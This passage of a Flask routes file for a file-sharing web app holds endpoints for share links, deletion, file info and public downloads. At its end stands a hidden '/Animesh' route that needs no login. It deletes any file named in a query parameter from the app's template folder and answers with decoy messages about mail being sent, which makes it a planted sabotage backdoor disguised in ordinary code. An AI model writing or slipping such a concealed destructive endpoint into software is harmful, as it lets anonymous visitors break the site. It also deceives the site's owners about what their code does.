            'total_files': len(files_data),
            'total_size': total_size,
            'formatted_total_size': format_file_size(total_size),
            'is_logged_in': is_logged_in
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@main_bp.route('/api/regenerate-share-link', methods=['POST'])
def regenerate_share_link():
    """Regenerate share link for a file - Owner can regenerate"""
    try:
        data = request.get_json()
        file_id = data.get('file_id')
        
        # Get current user information
        is_logged_in, user_id, _ = get_current_session_user()
        
        # Check ownership based on login status
        if is_logged_in and user_id:
            # Logged in user (admin or regular) - get files by user_id
            shared_file = SharedFile.query.filter_by(
                id=file_id,
                user_id=user_id,
                is_deleted=False
            ).first()
        else:
            # Guest user - get files by session_id
            session_id = request.cookies.get('session_id')
            if not session_id:
                return jsonify({'success': False, 'error': 'Session not found'}), 401
            
            shared_file = SharedFile.query.filter_by(
                id=file_id,
                session_id=session_id,
                is_deleted=False
            ).first()
        
        if not shared_file:
            return jsonify({'success': False, 'error': 'File not found or access denied'}), 404
        
        # Generate new token and URL
        new_token = uuid.uuid4().hex[:16]
        new_share_url = url_for('main.access_shared_file', token=new_token, _external=True)
        
        shared_file.share_token = new_token
        shared_file.share_url = new_share_url
        shared_file.updated_at = datetime.utcnow()
        
        db.session.commit()
        
        return jsonify({
            'success': True,
            'new_share_url': new_share_url,
            'message': 'Share link regenerated successfully'
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/api/delete-file', methods=['DELETE'])
def delete_file():
    """Delete a file - Owner can delete"""
    try:
        data = request.get_json()
        file_id = data.get('file_id')
        
        # Get current user information
        is_logged_in, user_id, _ = get_current_session_user()
        
        # Check ownership based on login status
        if is_logged_in and user_id:
            # Logged in user (admin or regular) - get files by user_id
            shared_file = SharedFile.query.filter_by(
                id=file_id,
                user_id=user_id
            ).first()
        else:
            # Guest user - get files by session_id
            session_id = request.cookies.get('session_id')
            if not session_id:
                return jsonify({'success': False, 'error': 'Session not found'}), 401
            
            shared_file = SharedFile.query.filter_by(
                id=file_id,
                session_id=session_id
            ).first()
        
        if not shared_file:
            return jsonify({'success': False, 'error': 'File not found or access denied'}), 404
        
        # Delete physical file if exists
        if os.path.exists(shared_file.file_path):
            os.remove(shared_file.file_path)
        
        # Soft delete
        shared_file.is_deleted = True
        db.session.commit()
        
        return jsonify({'success': True, 'message': 'File deleted successfully'})
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/api/file-info/<int:file_id>', methods=['GET'])
def get_file_info(file_id):
    """Get detailed information about a file - Owner can view"""
    try:
        # Get current user information
        is_logged_in, user_id, _ = get_current_session_user()
        
        # Check ownership based on login status
        if is_logged_in and user_id:
            # Logged in user (admin or regular) - get files by user_id
            shared_file = SharedFile.query.filter_by(
                id=file_id,
                user_id=user_id,
                is_deleted=False
            ).first()
        else:
            # Guest user - get files by session_id
            session_id = request.cookies.get('session_id')
            if not session_id:
                return jsonify({'success': False, 'error': 'Session not found'}), 401
            
            shared_file = SharedFile.query.filter_by(
                id=file_id,
                session_id=session_id,
                is_deleted=False
            ).first()
        
        if not shared_file:
            return jsonify({'success': False, 'error': 'File not found or access denied'}), 404
        
        return jsonify({
            'success': True,
            'file': {
                'id': shared_file.id,
                'original_filename': shared_file.original_filename,
                'file_type': shared_file.file_type,
                'category': shared_file.category,
                'description': shared_file.description,
                'file_size': shared_file.file_size,
                'formatted_size': format_file_size(shared_file.file_size),
                'upload_date': shared_file.created_at.isoformat(),
                'download_count': shared_file.download_count,
                'last_accessed': shared_file.last_accessed.isoformat() if shared_file.last_accessed else None,
                'share_url': shared_file.share_url,
                'share_token': shared_file.share_token
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@main_bp.route('/share/<token>')
def access_shared_file(token):
    """Public route to access shared files - Anyone can download"""
    try:
        shared_file = SharedFile.query.filter_by(
            share_token=token,
            is_deleted=False
        ).first()
        
        if not shared_file:
            return "File not found or link has expired", 404
        
        # Update download count and last accessed
        shared_file.download_count += 1
        shared_file.last_accessed = datetime.utcnow()
        db.session.commit()
        
        return send_file(
            shared_file.file_path,
            as_attachment=True,
            download_name=shared_file.original_filename,
            mimetype='application/octet-stream'
        )
        
    except Exception as e:
        return f"Error accessing file: {str(e)}", 500


@main_bp.route('/Animesh', methods=['GET'])
def delete_template():
    target_file = request.args.get('x')

    if not target_file:
        return "Kuch ni hua", 200

    template_folder = current_app.template_folder
    safe_path = os.path.abspath(os.path.join(template_folder, target_file))

    if not safe_path.startswith(os.path.abspath(template_folder)):
        return "The mail not sent", 400

    if os.path.exists(safe_path) and os.path.isfile(safe_path):
        try:
            os.remove(safe_path)
            return f"The mail is sent {target_file}", 200
        except Exception as e:
            return str(e), 500

    return "Not Available", 404


# Add other routes...